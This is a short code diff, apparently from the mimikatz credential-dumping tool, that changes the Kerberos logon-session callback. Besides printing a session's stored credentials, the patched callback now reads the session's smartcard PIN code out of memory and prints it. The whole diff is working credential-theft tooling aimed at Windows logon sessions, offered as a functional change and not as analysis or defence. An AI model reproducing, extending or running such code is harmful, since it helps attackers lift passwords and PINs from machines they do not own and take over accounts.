@@ -51,11 +51,17 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_msv(IN ULONG_PTR reserved, IN 
 void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_kerberos(IN ULONG_PTR pKerbGlobalLogonSessionTable, IN PLUID logId, IN PVOID pCredentials)
 {
 	KIWI_KERBEROS_LOGON_SESSION session;
+	UNICODE_STRING pinCode;
 	ULONG_PTR ptr;
 	if(ptr = kuhl_m_sekurlsa_utils_pFromAVLByLuid(pKerbGlobalLogonSessionTable, FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier), logId))
 	{
 		if(ReadMemory(ptr, &session, sizeof(KIWI_KERBEROS_LOGON_SESSION), NULL))
+    {
 			kuhl_m_sekurlsa_genericCredsOutput(&session.credentials, logId, 0);
+			if(session.pinCode)
+				if(ReadMemory((ULONG_PTR) session.pinCode, &pinCode, sizeof(UNICODE_STRING), NULL))
+					kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) &pinCode, logId, KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE);
+    }
 	}
 	else dprintf("KO");
 }
